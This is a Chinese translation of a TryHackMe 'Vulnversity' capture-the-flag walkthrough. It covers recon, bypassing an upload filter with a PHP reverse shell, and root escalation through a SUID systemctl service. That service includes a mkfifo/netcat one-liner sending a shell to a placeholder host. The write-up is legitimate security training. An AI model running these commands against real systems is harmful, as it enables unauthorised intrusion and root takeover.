<html>
<head>
<title>TryHackMe: Vulnversity</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">TryHackMe: Vulnversity</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/tryhackme-vulnversity-70ceeb601757?source=collection_archive---------0-----------------------#2021-06-20">https://infosecwriteups.com/tryhackme-vulnversity-70ceeb601757?source=collection_archive---------0-----------------------#2021-06-20</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><figure class="ip iq gp gr ir is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi io"><img src="../Images/675a74e18fd6c08527bb02815a0aa81b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aonfR0avER0h8gKbZPrVeg.png"/></div></div></figure><div class=""/><p id="f721" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这个房间主要关注主动侦察、web应用攻击和权限提升。</p><p id="b01b" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka jc">【任务1】部署机器</strong></p></div><div class="ab cl kw kx hu ky" role="separator"><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb"/></div><div class="ij ik il im in"><p id="fed6" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka jc">【任务二】侦察</strong></p><p id="c191" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在给定的机器上启动nmap扫描:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="1030" class="lm ln jb li b gy lo lp l lq lr">nmap -sC -sV -oN nmap/initial &lt;ip&gt;</span></pre><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi ls"><img src="../Images/91afda69e0f6e19d5addf71375c38999.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pHb76_HfuY9jzRXkHoalPg.png"/></div></div><figcaption class="lt lu gj gh gi lv lw bd b be z dk translated">初始计数</figcaption></figure><p id="733f" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们可以看到端口21、22、139、445、3128和3333是打开的。</p><p id="fde3" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">可以清楚地看到，操作系统是Ubuntu，WebServer(端口3333)在其上运行。</p><blockquote class="lx ly lz"><p id="0d79" class="jy jz ma ka b kb kc kd ke kf kg kh ki mb kk kl km mc ko kp kq md ks kt ku kv ij bi translated">扫描盒子，有多少端口是开放的？</p></blockquote><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="07a8" class="lm ln jb li b gy lo lp l lq lr">6</span></pre><blockquote class="lx ly lz"><p id="9fbc" class="jy jz ma ka b kb kc kd ke kf kg kh ki mb kk kl km mc ko kp kq md ks kt ku kv ij bi translated">机器上运行的是哪个版本的squid代理？</p></blockquote><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="ade3" class="lm ln jb li b gy lo lp l lq lr">3.5.12</span></pre><blockquote class="lx ly lz"><p id="3752" class="jy jz ma ka b kb kc kd ke kf kg kh ki mb kk kl km mc ko kp kq md ks kt ku kv ij bi translated">这台机器最有可能运行的操作系统是什么？</p></blockquote><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="d0e3" class="lm ln jb li b gy lo lp l lq lr">Ubuntu</span></pre><blockquote class="lx ly lz"><p id="1759" class="jy jz ma ka b kb kc kd ke kf kg kh ki mb kk kl km mc ko kp kq md ks kt ku kv ij bi translated">web服务器运行在哪个端口上？</p></blockquote><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="75e4" class="lm ln jb li b gy lo lp l lq lr">3333</span></pre><p id="6209" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们探索运行在web服务器上的http网站。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi me"><img src="../Images/ca27b63f5cd78b7bbfe61b645776c351.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*R2aq5tp-Yi1niT6JHbRqgg.png"/></div></div></figure><p id="a60e" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">站点上没有任何功能/按钮可用，视图源代码中也没有任何有趣的内容。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi me"><img src="../Images/baf70a9d36f3b6c1d8d401e4a56b74b5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ShIufk2TpKxsBpGP_0lM4g.png"/></div></div></figure></div><div class="ab cl kw kx hu ky" role="separator"><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb"/></div><div class="ij ik il im in"><p id="9ff4" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka jc">【任务三】使用GoBuster </strong>定位目录</p><p id="7e0e" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们在端口为3333的给定ip上运行gobuster扫描:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="143c" class="lm ln jb li b gy lo lp l lq lr">gobuster dir -u &lt;ip&gt;:&lt;port&gt; -w &lt;wordlist-path&gt;</span></pre><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi mf"><img src="../Images/a1e71bab5b6fa25d9e11728de15fe8b4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*dmbGm9WCC2sSQxsfJChWFQ.png"/></div></div><figcaption class="lt lu gj gh gi lv lw bd b be z dk translated">Gobuster扫描</figcaption></figure><p id="84ea" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们找到一个/internal目录，进一步的枚举指向/internal/uploads目录。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi mg"><img src="../Images/10a42ebda3d696af609f679aec38be4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ybaEkNerhRwVFJM3NeVWWg.png"/></div></div></figure><p id="0cb7" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们在/内部目录中找到一个上传表单。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi mh"><img src="../Images/bab94bcfd850c4f78ee911d44bfc3ca1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9s3bUytRN6l_D0eQxjUMRw.png"/></div></div></figure><blockquote class="lx ly lz"><p id="bb9a" class="jy jz ma ka b kb kc kd ke kf kg kh ki mb kk kl km mc ko kp kq md ks kt ku kv ij bi translated">有上传表单页面的目录是什么？</p></blockquote><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="8648" class="lm ln jb li b gy lo lp l lq lr">/internal/</span></pre></div><div class="ab cl kw kx hu ky" role="separator"><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb"/></div><div class="ij ik il im in"><p id="d813" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka jc">【任务4】危害网络服务器</strong></p><p id="3c33" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们试图上传一个php反向外壳脚本，但扩展被过滤。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div class="gh gi mi"><img src="../Images/9aaa5a70afee50963a04b6549753fb30.png" data-original-src="https://miro.medium.com/v2/resize:fit:1030/format:webp/1*8C3e_SZBNGY-ymUZuYsoMQ.png"/></div></figure><figure class="ld le lf lg gt is gh gi paragraph-image"><div class="gh gi mj"><img src="../Images/546e468ccdb9c25d816feae084249f04.png" data-original-src="https://miro.medium.com/v2/resize:fit:1380/format:webp/1*uVsUTwT1uw_QmsmG52NQJg.png"/></div></figure><p id="9ff5" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们启动burp套件，并在foxy代理中启用它。为狙击手攻击创建一个带有不同php扩展名的文件。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div class="gh gi mk"><img src="../Images/6983ba01d3fe813661922937b297dd96.png" data-original-src="https://miro.medium.com/v2/resize:fit:802/format:webp/1*AKlZ4JjwhEeD1m0WvEe9qA.png"/></div></figure><p id="d47d" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们捕获上传请求，然后发送给入侵者。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi ml"><img src="../Images/d245e873bfafca065d94096e101c0ad2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O5Pkq-ulL8YfEURlEaALRA.png"/></div></div></figure><p id="c406" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们将有效载荷作为一个简单的列表加载。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/6a15216205399bae1cababe85bbe9b50.png" data-original-src="https://miro.medium.com/v2/resize:fit:952/format:webp/1*TjVfrIjvcuTj8fnlMp8bEg.png"/></div></figure><p id="f04b" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们在有效载荷的位置选项卡中添加文件扩展名。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi mn"><img src="../Images/5648a241a1bfe4fd6d5821864cb22783.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*mEcXWYPbBi7G0Hr_sjuSNg.png"/></div></div></figure><p id="f4eb" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们开始攻击，然后得到结果。有趣的是，我们看到每一个扩展都产生200的状态，但是。phtml扩展与其他扩展不同。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/3a8db754ae72b0d854915a43c588cc09.png" data-original-src="https://miro.medium.com/v2/resize:fit:1162/format:webp/1*lpak_vIapyxGKeE8YlYWyQ.png"/></div></figure><p id="80ee" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们尝试上传一个shell.phtml(php反向shell)并成功上传。</p><p id="4bc7" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们启动一个netcat监听器:</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="3fc3" class="lm ln jb li b gy lo lp l lq lr">nc -lvp 4444</span></pre><figure class="ld le lf lg gt is gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/369ac7e138f602efd9b0729beca871a3.png" data-original-src="https://miro.medium.com/v2/resize:fit:712/format:webp/1*MQiBN_46rR_AM8DtsAhybA.png"/></div></figure><p id="ceee" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">然后，我们转到/internal/uploads，单击我们上传的文件。我们的机器上有一个反向外壳。我们稳定反向外壳。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi mq"><img src="../Images/9d3085a355b84073b2a3249687bfc953.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*UVCclAQCLCC0xR4NTRYPLQ.png"/></div></div></figure><p id="81c6" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">目前我们是万维网数据用户。如果我们查看/etc/passwd文件，我们会发现一个名为<strong class="ka jc"> bill </strong>的用户。我们可以直接去/home/bill目录，找到我们的user.txt标志。</p><blockquote class="lx ly lz"><p id="57b9" class="jy jz ma ka b kb kc kd ke kf kg kh ki mb kk kl km mc ko kp kq md ks kt ku kv ij bi translated">管理web服务器的用户名是什么？</p></blockquote><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="b9a4" class="lm ln jb li b gy lo lp l lq lr">bill</span></pre><blockquote class="lx ly lz"><p id="d6ec" class="jy jz ma ka b kb kc kd ke kf kg kh ki mb kk kl km mc ko kp kq md ks kt ku kv ij bi translated">什么是用户标志？</p></blockquote><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="baf5" class="lm ln jb li b gy lo lp l lq lr">8bd**************************edb</span></pre></div><div class="ab cl kw kx hu ky" role="separator"><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb"/></div><div class="ij ik il im in"><p id="66a0" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka jc">[任务5]权限提升</strong></p><p id="2246" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们在系统中查找SUID的档案。SUID向用户授予临时权限，允许其在文件所有者(而不是运行程序/文件的用户)的许可下运行程序/文件。</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="5214" class="lm ln jb li b gy lo lp l lq lr">find / -perm -u=s -type f 2&gt;/dev/null</span></pre><figure class="ld le lf lg gt is gh gi paragraph-image"><div class="gh gi mr"><img src="../Images/6ee394d884154864e39f66c845ad8164.png" data-original-src="https://miro.medium.com/v2/resize:fit:1320/format:webp/1*icevDMgJYpNlb0FqeLMpLw.png"/></div></figure><p id="36c1" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们看到/bin/systemctl是一个SUID二进制文件。我们可以用这个来获得特权。我们查看gtfobins并搜索systemctl。</p><p id="bffa" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">参考:[<a class="ae ms" href="https://gtfobins.github.io/gtfobins/systemctl/" rel="noopener ugc nofollow" target="_blank">https://gtfobins.github.io/gtfobins/systemctl/</a></p><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi me"><img src="../Images/840fafeae0a5fb99c53ad1fbcd4e50d3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*fieN6n9fT1lftZp_wxt4nA.png"/></div></div></figure><p id="3518" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们创建一个临时服务，然后用它来查看root.txt文件。</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="eb77" class="lm ln jb li b gy lo lp l lq lr">TF=$(mktemp).service</span><span id="c3f6" class="lm ln jb li b gy mt lp l lq lr">echo '[Service]<br/>ExecStart=/bin/sh -c "cat /root/root.txt &gt; /tmp/output"<br/>[Install]<br/>WantedBy=multi-user.target' &gt;$TF</span><span id="dcf0" class="lm ln jb li b gy mt lp l lq lr">/bin/systemctl link $TF<br/>/bin/systemctl enable --now $TF</span></pre><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi mu"><img src="../Images/79634ab799451d253cea7d1cf19b4ef3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HgIcBWIYZ843kViuieKzQQ.jpeg"/></div></div></figure><p id="6ff6" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">同样，我们可以获得一个具有root权限的反向shell。</p><p id="bede" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">参考:[<a class="ae ms" href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="noopener ugc nofollow" target="_blank">http://pentest monkey . net/cheat-sheet/shell/reverse-shell-cheat-sheet</a>]</p><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="6a26" class="lm ln jb li b gy lo lp l lq lr">ken=$(mktemp).service</span><span id="82b1" class="lm ln jb li b gy mt lp l lq lr">echo '[Service]<br/>ExecStart=/bin/sh -c "/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1| nc &lt;ip&gt; &lt;port&gt;"<br/>[Install]<br/>WantedBy=multi-user.target' &gt;$ken</span><span id="8b06" class="lm ln jb li b gy mt lp l lq lr">/bin/systemctl link $ken<br/>/bin/systemctl enable --now $ken</span></pre><figure class="ld le lf lg gt is gh gi paragraph-image"><div role="button" tabindex="0" class="it iu di iv bf iw"><div class="gh gi mv"><img src="../Images/7c047689bca10c4fc1d93f9c152fa26b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Ssg9hdvwTgs531lWK-zD4w.png"/></div></div></figure><p id="9e3b" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这将在我们的机器上产生一个反向shell。</p><figure class="ld le lf lg gt is gh gi paragraph-image"><div class="gh gi mw"><img src="../Images/edecbbe21cc120ab37b4402087472ad6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*5WB73yeIySmNndWIRY-2lQ.png"/></div></figure><blockquote class="lx ly lz"><p id="9005" class="jy jz ma ka b kb kc kd ke kf kg kh ki mb kk kl km mc ko kp kq md ks kt ku kv ij bi translated">在系统上，搜索所有SUID文件。什么文件比较突出？</p></blockquote><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="fd08" class="lm ln jb li b gy lo lp l lq lr">/bin/systemctl</span></pre><blockquote class="lx ly lz"><p id="4c11" class="jy jz ma ka b kb kc kd ke kf kg kh ki mb kk kl km mc ko kp kq md ks kt ku kv ij bi translated">成为root并获取最后一个标志(/root/root.txt)</p></blockquote><pre class="ld le lf lg gt lh li lj lk aw ll bi"><span id="d241" class="lm ln jb li b gy lo lp l lq lr">a58**************************fd5</span></pre></div><div class="ab cl kw kx hu ky" role="separator"><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb lc"/><span class="kz bw bk la lb"/></div><div class="ij ik il im in"><p id="db83" class="pw-post-body-paragraph jy jz jb ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">TryHackMe简介:【https://tryhackme.com/p/kaneki10007 T2</p></div></div>    
</body>
</html>